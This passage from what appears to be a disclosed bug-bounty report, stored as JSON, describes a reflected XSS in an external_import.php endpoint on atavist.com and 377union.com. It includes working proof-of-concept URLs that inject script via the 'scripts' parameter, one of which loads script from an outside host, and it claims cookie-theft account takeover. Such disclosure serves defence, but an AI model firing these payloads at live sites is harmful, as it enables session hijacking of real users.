_at":"2020-11-18T02:57:14.491Z","team_member_agreed_on_going_public_at":"2020-11-18T14:21:52.889Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nHi team,\nI found this php file https://magazine.atavist.com/static/external_import.php , and there is a parameter called `scripts` on this php file. \nBasically, the endpoint prints value of `scripts` parameter to `\u003cscript src='$Value'\u003e`.\nSo we can import any script file like that : https://magazine.atavist.com/static/external_import.php?scripts=//15.rs\nOr we can write HTML tags too, there is no encoding : https://magazine.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\n\nThis endpoint is also available on other websites. Like :\nhttps://docs.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\nhttp://www.377union.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\n\nAlso there is no secure flag on the session cookie (`periodicSessionatavist`). So this XSS leads to account takeover.\n\n## Impact\n\nReflected XSS - account takeover via cookie stealing\n\nThanks,\nBugra","vulnerability_information_html":"\u003ch2 id=\"summary\"\u003eSummary:\u003c/h2\u003e\n\n\u003cp\u003eHi team,\u003cbr\u003e\nI found this php file \u003ca title=\"https://magazine.atavist.com/static/external_import.php\" href=\"/redirect?url=https%3A%2F%2Fmagazine.atavist.com%2Fstatic%2Fexternal_import.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://magazine.atavist.com/static/external_import.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e , and there is a parameter called \u003ccode\u003escripts\u003c/code\u003e on this php file. \u003cbr\u003e\nBasically, the endpoint prints value of \u003ccode\u003escripts\u003c/code\u003e parameter to \u003ccode\u003e\u0026lt;script src=\u0026#39;$Value\u0026#39;\u0026gt;\u003c/code\u003e.\u003cbr\u003e\nSo we can import any script file like that : \u003ca title=\"https://magazine.atavist.com/static/external_import.php?scripts=//15.rs\" href=\"/redirect?url=https%3A%2F%2Fmagazine.atavist.com%2Fstatic%2Fexternal_import.php%3Fscripts%3D%2F%2F15.rs\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://magazine.atavist.com/static/external_import.php?scripts=//15.rs\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nOr we can write HTML tags too, there is no encoding : \u003ca title=\"https://magazine.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\" href=\"/redirect?url=https%3A%2F%2Fmagazine.atavist.com%2Fstatic%2Fexternal_import.php%3Fscripts%3D%2527%253E%253C%2Fscript%253E%253Cscript%253Ealert%281%29%253C%2Fscript%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://magazine.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis endpoint is also available on other websites. Like :\u003cbr\u003e\n\u003ca title=\"https://docs.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\" href=\"/redirect?url=https%3A%2F%2Fdocs.atavist.com%2Fstatic%2Fexternal_import.php%3Fscripts%3D%2527%253E%253C%2Fscript%253E%253Cscript%253Ealert%281%29%253C%2Fscript%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://docs.atavist.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"http://www.377union.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\" href=\"/redirect?url=http%3A%2F%2Fwww.377union.com%2Fstatic%2Fexternal_import.php%3Fscripts%3D%2527%253E%253C%2Fscript%253E%253Cscript%253Ealert%281%29%253C%2Fscript%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.377union.com/static/external_import.php?scripts=%27%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAlso there is no secure flag on the session cookie (\u003ccode\u003eperiodicSessionatavist\u003c/code\u003e). So this XSS leads to account takeover.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eReflected XSS - account takeover via cookie stealing\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nBugra\u003c/p\u003e\n","bounty_amount":"150.0","formatted_bounty":"$150","weakness":{"id":61,"name":"Cross-site Scripting (XSS) - Reflected"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-12-18T02:57:14.633Z","allow_singular_disclosure_after":-966012.879703265,"singular_disclosure_allowed":true,"vote_count":13,"voters":["bombon","pyrrhon","kapkan","th4nu_0x0","cyanpiny","aporlorxl23","realtess","yusuf_furkan","mehmettcan","sunalil","and 3 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":9167182,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your submission. Your report will be reviewed and we'll get back to you shortly.","markdown_message":"\u003cp\u003eThank you for your submission. Your report will be reviewed and we\u0026#39;ll get back to you shortly.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-09-09T08:17:33